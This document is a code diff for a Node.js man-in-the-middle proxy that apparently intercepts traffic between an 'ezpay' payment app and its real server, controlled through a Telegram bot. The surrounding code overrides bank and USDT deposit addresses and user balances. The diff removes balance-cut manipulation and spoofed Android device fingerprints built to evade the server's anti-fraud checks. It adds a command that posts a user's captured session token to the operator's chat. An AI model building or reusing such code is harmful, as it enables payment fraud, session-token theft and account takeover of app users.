@@ -24,7 +24,6 @@ const DEFAULT_DATA = {
   withdrawOverride: 0,
   userOverrides: {},
   trackedUsers: {},
-  suspendedPhones: {},
   blockUpdate: true
 };
 
@@ -124,7 +123,7 @@ async function saveData(data) {
     if (!skipMerge) {
       const current = await redis.get('ezpayData');
       if (current && typeof current === 'object') {
-        const settingsKeys = ['banks', 'activeIndex', 'autoRotate', 'botEnabled', 'usdtAddress', 'logRequests', 'suspendedPhones', 'adminChatId', 'depositSuccess', 'depositBonus', 'withdrawOverride', 'blockUpdate', 'deviceLockEnabled'];
+        const settingsKeys = ['banks', 'activeIndex', 'autoRotate', 'botEnabled', 'usdtAddress', 'logRequests', 'adminChatId', 'depositSuccess', 'depositBonus', 'withdrawOverride', 'blockUpdate'];
         for (const key of settingsKeys) {
           if (current[key] !== undefined) {
             data[key] = current[key];
@@ -838,8 +837,6 @@ app.post('/bot-webhook', async (req, res) => {
 /log — Toggle request logging
 /off log <userId> — Log off for user
 /on log <userId> — Log on for user
-/update — Block update popup (default ON)
-/update on — Allow update popup
 /status — Full status
 /debug — Debug next response
 
@@ -855,11 +852,6 @@ app.post('/bot-webhook', async (req, res) => {
 /usdt <address> — Set USDT address
 /usdt off — Disable USDT override
 
-=== SUSPEND ===
-/suspend <phone> — Block login for phone
-/unsuspend <phone> — Unblock login
-/suspended — List all suspended
-
 === TRACKING ===
 /idtrack — Show all tracked user IDs
 
@@ -870,6 +862,7 @@ app.post('/bot-webhook', async (req, res) => {
 /profile <id> — MemberCode, phone, balance, frozen, today's commission
 /customer <id> — Customer service links
 /tgrobot <id> — TG robot bind status + bind code
+/lasttoken <id> — Show last captured real apptoken for user
 
 === ACTIONS ===
 /sendcode <id> [codeType] — Send OTP (default unbindRobot)
@@ -903,22 +896,6 @@ Example:
     if (text === '/log') { data = await loadData(true); data.logRequests = !data.logRequests; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, `📋 Logging: ${data.logRequests ? 'ON' : 'OFF'}`); return res.sendStatus(200); }
 
     if (text === '/debug') { debugNextResponse = true; await bot.sendMessage(chatId, '🔍 Debug ON — next bank-replace request ka full response dump aayega'); return res.sendStatus(200); }
-
-    if (text === '/update' || text === '/update off' || text === '/update on') {
-      data = await loadData(true);
-      if (text === '/update on') {
-        data.blockUpdate = false;
-        data._skipOverrideMerge = true;
-        await saveData(data);
-        await bot.sendMessage(chatId, '✅ Update popup ALLOWED\nReal server ka update dialog ab dikhega.');
-      } else {
-        data.blockUpdate = true;
-        data._skipOverrideMerge = true;
-        await saveData(data);
-        await bot.sendMessage(chatId, '🚫 Update popup BLOCKED\nReal server ka update popup ab nahi dikhega app mein.');
-      }
-      return res.sendStatus(200);
-    }
 
     if (text.startsWith('/off log ')) {
       const targetId = text.substring(9).trim();
@@ -1107,30 +1084,8 @@ Example:
       return res.sendStatus(200);
     }
 
-    if (text.startsWith('/control sell ')) {
-      const sellTargetId = text.substring(14).trim();
-      if (!sellTargetId) { await bot.sendMessage(chatId, '❌ Format: /control sell <userId>'); return res.sendStatus(200); }
-      data = await loadData(true);
-      if (!data.userOverrides) data.userOverrides = {};
-      if (!data.userOverrides[sellTargetId]) data.userOverrides[sellTargetId] = {};
-      const currentState = !!data.userOverrides[sellTargetId].sellControl;
-      data.userOverrides[sellTargetId].sellControl = !currentState;
-      if (!currentState) {
-        delete data.userOverrides[sellTargetId].lastRealBalance;
-      }
-      data._skipOverrideMerge = true;
-      await saveData(data);
-      const stateText = data.userOverrides[sellTargetId].sellControl ? '🟢 ON' : '🔴 OFF';
-      let msg = `🔒 Sell Control ${stateText}\n👤 User: ${sellTargetId}\n💰 Cut Amount: ₹50 (fixed)`;
-      if (data.userOverrides[sellTargetId].sellControl) {
-        msg += `\n\n📌 Next /mine call se balance track hoga`;
-        msg += `\n📌 Har sell cut ₹50 mein convert hoga`;
-      }
-      await bot.sendMessage(chatId, msg);
-      return res.sendStatus(200);
-    }
 
-    const TOKEN_CMDS = 'profile|customer|tgrobot|sendcode|unbind';
+    const TOKEN_CMDS = 'profile|customer|tgrobot|sendcode|unbind|lasttoken';
     const tokenCmdMatch = text.match(new RegExp(`^\\/(${TOKEN_CMDS})\\s+(.+)$`, 'i'));
     if (tokenCmdMatch) {
       const cmd = tokenCmdMatch[1].toLowerCase();
@@ -1276,38 +1231,17 @@ Example:
           await bot.sendMessage(chatId, truncate(m));
           return res.sendStatus(200);
         }
+
+        if (cmd === 'lasttoken') {
+          await bot.sendMessage(chatId, `🔑 LAST TOKEN\n👤 User: ${uid || 'N/A'}\n━━━━━━━━━━━━━━━━━━\n\`${rawToken}\``, { parse_mode: 'Markdown' });
+          return res.sendStatus(200);
+        }
       } catch(e) {
         await bot.sendMessage(chatId, `❌ /${cmd} failed: ${e.message}`);
         return res.sendStatus(200);
       }
     }
 
-    if (text === '/sell history' || text.startsWith('/sell history ')) {
-      const shTarget = text.startsWith('/sell history ') ? text.substring(14).trim() : '';
-      const sh = data.sellHistory || [];
-      if (sh.length === 0) { await bot.sendMessage(chatId, '📋 No sell cut history yet.'); return res.sendStatus(200); }
-      const filtered = shTarget ? sh.filter(h => String(h.userId) === shTarget) : sh;
-      if (filtered.length === 0) { await bot.sendMessage(chatId, `📋 No sell history for user ${shTarget}`); return res.sendStatus(200); }
-      const last10 = filtered.slice(-10);
-      let totalOriginal = 0, totalModified = 0, totalSaved = 0;
-      for (const h of filtered) {
-        totalOriginal += h.originalCut || 0;
-        totalModified += h.modifiedCut || 0;
-        totalSaved += h.compensation || 0;
-      }
-      let msg = `🔒 SELL CUT HISTORY\n━━━━━━━━━━━━━━━━━━\n`;
-      msg += `📊 Total Intercepts: ${filtered.length}\n`;
-      msg += `📥 Total Original Cuts: ₹${totalOriginal.toFixed(2)}\n`;
-      msg += `✂️ Total Modified Cuts: ₹${totalModified.toFixed(2)}\n`;
-      msg += `💰 Total Saved: ₹${totalSaved.toFixed(2)}\n`;
-      msg += `━━━━━━━━━━━━━━━━━━\n\n`;
-      for (const h of last10) {
-        msg += `👤 ${h.userId} | ₹${h.originalCut} → ₹${h.modifiedCut} | ${h.time}\n`;
-      }
-      if (filtered.length > 10) msg += `\n... showing last 10 of ${filtered.length}`;
-      await bot.sendMessage(chatId, msg);
-      return res.sendStatus(200);
-    }
 
     if (text === '/history' || text.startsWith('/history ')) {
       const historyTarget = text.startsWith('/history ') ? text.substring(9).trim() : '';
@@ -1476,83 +1410,6 @@ Example:
     }
 
 
-    if (text.startsWith('/suspend ')) {
-      const suspendPhone = text.substring(9).trim();
-      if (!suspendPhone) { await bot.sendMessage(chatId, '❌ Format: /suspend <phoneNumber>\nExample: /suspend 9876543210'); return res.sendStatus(200); }
-      data = await loadData(true);
-      if (!data.suspendedPhones) data.suspendedPhones = {};
-      data.suspendedPhones[suspendPhone] = { suspended: true, time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }) };
-      data._skipOverrideMerge = true;
-      await saveData(data);
-      await bot.sendMessage(chatId, `🚫 Suspended: ${suspendPhone}\nUser will see "ID Suspended" on login.\n\nTo unsuspend: /unsuspend ${suspendPhone}`);
-      return res.sendStatus(200);
-    }
-
-    if (text.startsWith('/unsuspend ')) {
-      const unsuspendPhone = text.substring(11).trim();
-      if (!unsuspendPhone) { await bot.sendMessage(chatId, '❌ Format: /unsuspend <phoneNumber>'); return res.sendStatus(200); }
-      data = await loadData(true);
-      if (data.suspendedPhones && data.suspendedPhones[unsuspendPhone]) {
-        delete data.suspendedPhones[unsuspendPhone];
-        data._skipOverrideMerge = true;
-        await saveData(data);
-        await bot.sendMessage(chatId, `✅ Unsuspended: ${unsuspendPhone}\nUser can login now.`);
-      } else {
-        await bot.sendMessage(chatId, `ℹ️ ${unsuspendPhone} is not suspended.`);
-      }
-      return res.sendStatus(200);
-    }
-
-    if (text === '/suspended') {
-      const phones = data.suspendedPhones ? Object.keys(data.suspendedPhones) : [];
-      if (phones.length === 0) { await bot.sendMessage(chatId, '📋 No suspended users.'); return res.sendStatus(200); }
-      let msg = '🚫 SUSPENDED USERS\n━━━━━━━━━━━━━━━━━━\n';
-      for (const p of phones) {
-        msg += `📱 ${p} — ${data.suspendedPhones[p].time || 'N/A'}\n`;
-      }
-      await bot.sendMessage(chatId, msg);
-      return res.sendStatus(200);
-    }
-
-    if (text === '/devicelock' || text === '/devicelock on' || text === '/devicelock off') {
-      data = await loadData(true);
-      if (text === '/devicelock on') data.deviceLockEnabled = true;
-      else if (text === '/devicelock off') data.deviceLockEnabled = false;
-      else data.deviceLockEnabled = (data.deviceLockEnabled === false); // toggle
-      data._skipOverrideMerge = true;
-      await saveData(data);
-      await bot.sendMessage(chatId, `🛡 Device Lock: ${data.deviceLockEnabled !== false ? 'ON 🟢' : 'OFF 🔴'}\n\nON = har user ka first-seen device fingerprint Redis me lock ho jata hai. Sab subsequent /memberDevice/add calls wahi same fingerprint upstream forward karenge → "system service is very busy" / device-mismatch logout block.`);
-      return res.sendStatus(200);
-    }
-
-    if (text.startsWith('/devicereset ')) {
-      const targetId = text.substring(13).trim();
-      if (!targetId) { await bot.sendMessage(chatId, '❌ Format: /devicereset <userId|MC code>'); return res.sendStatus(200); }
-      const mc = targetId.startsWith('MC') ? targetId : ('MC' + targetId);
-      let removed = 0;
-      if (redis) { try { removed = await redis.hdel('ezpayDeviceMap', mc); } catch(e) {} }
-      await bot.sendMessage(chatId, `🗑 Device fingerprint reset: ${mc}\nRemoved: ${removed}\n\nNext /memberDevice/add se naya random Indian device generate hoga.`);
-      return res.sendStatus(200);
-    }
-
-    if (text.startsWith('/deviceshow ')) {
-      const targetId = text.substring(12).trim();
-      if (!targetId) { await bot.sendMessage(chatId, '❌ Format: /deviceshow <userId|MC code>'); return res.sendStatus(200); }
-      const mc = targetId.startsWith('MC') ? targetId : ('MC' + targetId);
-      let stored = null;
-      if (redis) {
-        try {
-          const raw = await redis.hget('ezpayDeviceMap', mc);
-          if (raw) stored = (typeof raw === 'string') ? JSON.parse(raw) : raw;
-        } catch(e) {}
-      }
-      if (!stored) { await bot.sendMessage(chatId, `ℹ️ ${mc} ke liye koi locked device nahi hai. (User ne abhi tak /memberDevice/add nahi kiya, ya reset ho gaya.)`); return res.sendStatus(200); }
-      let m = `🛡 LOCKED DEVICE: ${mc}\n━━━━━━━━━━━━━━━━━━\n`;
-      for (const [k, v] of Object.entries(stored)) m += `${k}: ${v}\n`;
-      await bot.sendMessage(chatId, m);
-      return res.sendStatus(200);
-    }
-
     if (text === '/help') {
       await bot.sendMessage(chatId, 'Use /start to see all commands.');
       return res.sendStatus(200);
@@ -1570,14 +1427,6 @@ app.post('/app/api/system/v2/login', async (req, res) => {
     const data = await loadData();
     const body = req.parsedBody || {};
     const phone = body.memberPhone || body.phone || body.mobile || body.telephone || body.username || '';
-    if (phone && data.suspendedPhones && data.suspendedPhones[String(phone)]) {
-      if (data.adminChatId && bot) {
-        bot.sendMessage(data.adminChatId, `🚫 BLOCKED LOGIN\n📱 Phone: ${phone}\n🔒 Status: Suspended\n🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`).catch(()=>{});
-      }
-      const fakeResp = { code: 500, message: 'ID Suspended', data: null };
-      res.set('Content-Type', 'application/json');
-      return res.status(200).json(fakeResp);
-    }
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
     const userId = await extractUserId(req, jsonResp);
     const loginData = getResponseData(jsonResp) || {};
@@ -2382,42 +2231,7 @@ app.all('/app/api/memberManager/mine', async (req, res) => {
         }
       }
     }
-    let sellCutReport = null;
-    if (effectiveUserId && respData && typeof respData === 'object') {
-      const userOvr = data.userOverrides && data.userOverrides[String(effectiveUserId)];
-      if (userOvr && userOvr.sellControl) {
-        const realBalance = parseFloat(respData.balance ?? respData.availableBalance ?? respData.amount ?? 0) || 0;
-        const lastReal = userOvr.lastRealBalance;
-        if (lastReal !== undefined && lastReal !== null) {
-          const drop = parseFloat((lastReal - realBalance).toFixed(2));
-          if (drop > 0) {
-            const desiredCut = 50;
-            const compensation = drop > desiredCut ? parseFloat((drop - desiredCut).toFixed(2)) : 0;
-            const prevAdded = data.userOverrides[String(effectiveUserId)].addedBalance || 0;
-            if (compensation > 0) {
-              data.userOverrides[String(effectiveUserId)].addedBalance = parseFloat((prevAdded + compensation).toFixed(2));
-            }
-            sellCutReport = {
-              userId: effectiveUserId,
-              phone: phone || '',
-              originalCut: drop,
-              modifiedCut: drop > desiredCut ? desiredCut : drop,
-              compensation: compensation,
-              prevAddedBalance: prevAdded,
-              newAddedBalance: data.userOverrides[String(effectiveUserId)].addedBalance || prevAdded,
-              realBalanceBefore: lastReal,
-              realBalanceAfter: realBalance,
-              time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
-            };
-            if (!data.sellHistory) data.sellHistory = [];
-            data.sellHistory.push(sellCutReport);
-          }
-        }
-        data.userOverrides[String(effectiveUserId)].lastRealBalance = realBalance;
-        data._skipOverrideMerge = true;
-        await saveData(data);
-      }
-    }
+
     if (effectiveUserId && respData && typeof respData === 'object') {
       const userOvr = data.userOverrides && data.userOverrides[String(effectiveUserId)];
       const addedBal = userOvr && userOvr.addedBalance !== undefined ? userOvr.addedBalance : 0;
@@ -2804,96 +2618,7 @@ app.all('/app/api/customer/list', async (req, res) => {
   } catch(e) { await transparentProxy(req, res); }
 });
 
-// ===== Device fingerprint lock (memberDevice/add) =====
-// APK posts DeviceInfoApi (deviceName/model/brand/googleId/resolution/networkOperator/etc)
-// to /app/api/memberDevice/add right after login. Server detects device-mismatch ⇒ kicks
-// session and flags account ("system service is very busy" / "token check error").
-// Fix: per-memberCode, generate ONE stable random Indian device fingerprint, store in
-// Redis (`ezpayDeviceMap`), and replay it on every subsequent call so server always
-// sees the SAME device for that member. Toggle via bot: /devicelock on/off.
-function makeDeviceFingerprint(seedKey) {
-  const seed = crypto.createHash('sha256').update(String(seedKey)).digest();
-  const pick = (arr, off) => arr[seed[off] % arr.length];
-  const brands = [
-    { brand: 'Xiaomi', manuf: 'Xiaomi', models: ['Redmi Note 11', 'Redmi 10', 'Redmi 9A', 'POCO M3', 'M2010J19SI', 'M2102J20SG', '22011119TI'] },
-    { brand: 'realme', manuf: 'realme', models: ['RMX2185', 'RMX3201', 'RMX3231', 'RMX3501', 'RMX3151'] },
-    { brand: 'samsung', manuf: 'samsung', models: ['SM-A125F', 'SM-A325F', 'SM-M127F', 'SM-A536E', 'SM-G991B', 'SM-A047F'] },
-    { brand: 'vivo', manuf: 'vivo', models: ['V2027', 'V2111', 'V2120', 'V2150', 'V2207'] },
-    { brand: 'OPPO', manuf: 'OPPO', models: ['CPH2239', 'CPH2371', 'CPH2333', 'CPH2451'] },
-    { brand: 'motorola', manuf: 'motorola', models: ['moto g32', 'moto g42', 'moto g62 5G', 'moto e40'] }
-  ];
-  const b = pick(brands, 0);
-  const model = pick(b.models, 1);
-  const osVerArr = ['10', '11', '12', '13', '14'];
-  const osVer = pick(osVerArr, 2);
-  const resolutions = ['1080x2400', '720x1600', '1080x2340', '1440x3088', '720x1612', '1080x2412'];
-  const operators = [
-    { op: '405854', name: 'Jio' }, { op: '40410', name: 'Airtel' },
-    { op: '404005', name: 'Vodafone Idea' }, { op: '40455', name: 'BSNL' },
-    { op: '405845', name: 'Jio' }
-  ];
-  const op = pick(operators, 3);
-  const buildId = `RP1A.${(seed[4] % 30) + 200001}.0${(seed[5] % 9) + 1}`;
-  const incremental = String(seed.readUInt32BE(6) % 9999999).padStart(7, '0');
-  const fingerprint = `${b.brand}/${model}/${model.toLowerCase().replace(/[^a-z0-9]/g, '')}:${osVer}/${buildId}/${incremental}:user/release-keys`;
-  const androidId = seed.slice(0, 8).toString('hex');
-  return {
-    deviceName: model, model: model, brand: b.brand, googleId: androidId,
-    rootJailbreak: '0', deviceIp: '', resolution: pick(resolutions, 7),
-    deviceType: '1', deviceManufacturer: b.manuf, os: 'Android', osVersion: osVer,
-    buildVersion: fingerprint, networkOperator: op.op, networkOperatorName: op.name,
-    userAgent: `Mozilla/5.0 (Linux; Android ${osVer}; ${model}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.0.0 Mobile Safari/537.36`
-  };
-}
 
-app.post('/app/api/memberDevice/add', async (req, res) => {
-  const data = await loadData();
-  let userId = '';
-  try { userId = (await extractUserId(req, null)) || ''; } catch(e) {}
-  const memberCode = userId ? (String(userId).startsWith('MC') ? String(userId) : ('MC' + userId)) : '';
-  const tokSnip = (getTokenFromReq(req) || '').substring(0, 32);
-  const lockEnabled = (data.deviceLockEnabled !== false); // default ON
-  // Seed includes random bytes so /devicereset → next /memberDevice/add yields a brand-new
-  // fingerprint. Stored result is replayed verbatim on subsequent calls (stability).
-  const seedKey = (memberCode || tokSnip || 'anon') + ':' + crypto.randomBytes(12).toString('hex');
-
-  let stored = null;
-  if (lockEnabled && redis && memberCode) {
-    try {
-      const raw = await redis.hget('ezpayDeviceMap', memberCode);
-      if (raw) stored = (typeof raw === 'string') ? (JSON.parse(raw) || null) : raw;
-    } catch(e) {}
-  }
-  if (lockEnabled && !stored) {
-    stored = makeDeviceFingerprint(seedKey);
-    if (redis && memberCode) {
-      redis.hset('ezpayDeviceMap', memberCode, JSON.stringify(stored)).catch(()=>{});
-    }
-  }
-
-  if (lockEnabled && stored) {
-    const newBody = Buffer.from(JSON.stringify(stored));
-    req.rawBody = newBody;
-    req.parsedBody = stored;
-    req.headers['content-length'] = String(newBody.length);
-    req.headers['content-type'] = 'application/json; charset=utf-8';
-  }
-
-  if (data.adminChatId && bot) {
-    const tag = (lockEnabled && stored)
-      ? `🛡 DEVICE LOCK (${memberCode || 'unknown'})\n📱 ${stored.brand} ${stored.model} • Android ${stored.osVersion}\n🆔 ${stored.googleId} • ${stored.networkOperatorName}`
-      : `📱 DEVICE PASSTHROUGH (lock OFF) — memberCode=${memberCode || 'unknown'}`;
-    bot.sendMessage(data.adminChatId, tag).catch(()=>{});
-  }
-
-  try {
-    const { response, respBody, respHeaders } = await proxyFetch(req);
-    res.writeHead(response.status, respHeaders);
-    res.end(respBody);
-  } catch(e) {
-    if (!res.headersSent) res.status(502).json({ error: 'proxy error', message: e.message });
-  }
-});
 
 app.all('*', async (req, res) => {
   const data = cachedData || await loadData();
